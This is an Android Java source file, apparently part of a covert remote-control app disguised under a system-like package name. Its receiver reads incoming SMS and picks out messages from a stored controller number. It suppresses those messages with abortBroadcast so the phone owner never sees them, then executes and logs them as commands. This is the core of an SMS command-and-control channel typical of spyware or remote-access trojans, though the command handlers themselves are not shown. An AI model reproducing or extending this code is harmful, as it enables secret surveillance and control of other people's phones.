package com.android.system.controled.receiver;

import java.io.File;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.Code;
import com.android.system.controled.db.InnerDbOpera;
import com.android.system.controled.util.DoAboutCodeUtils;
import com.android.system.controled.util.FileUtil;
import com.android.system.controled.util.InitUtil;
import com.android.system.controled.util.StringUtil;
import com.android.system.controled.util.TimeUtil;

public class MsgAndOtherReceiver extends BroadcastReceiver {

	private static final String TAG = "MsgAndOtherReceiver";

	@Override
	public void onReceive(Context context, Intent intent) {

		InitUtil.init(context);

		Debug.e(TAG, "intent.getAction()=" + intent.getAction());

		if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
			SmsMessage[] msg = null;
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdusObj = (Object[]) bundle.get("pdus");
				msg = new SmsMessage[pdusObj.length];
				int mmm = pdusObj.length;
				for (int i = 0; i < mmm; i++)
					msg[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
			}

			String msgTxt = "";
			int msgLength = msg.length;
			for (int i = 0; i < msgLength; i++) {
				msgTxt += msg[i].getMessageBody();
			}

			// 获得发信人号码
			String getFromNum = "";
			for (SmsMessage currMsg : msg) {
				getFromNum = currMsg.getDisplayOriginatingAddress();
			}

			Debug.v("MsgReceiver", getFromNum);
			if (getFromNum.contains(MainApplication.getInstence().getControllerTel())) {
				if (DoAboutCodeUtils.isCode(msgTxt)) {
					abortBroadcast();
					// 记录命令集
					Code code =  new Code();
					code.setDate(TimeUtil.getCurrentTimeMillisInner());
					code.setRedoNeed(Code.REDO_NEED);
					code = DoAboutCodeUtils.doOperaByMessage(context, msgTxt, code);
					InnerDbOpera.getInstence().insertCode(code);
				}
			}
		}
	}

}
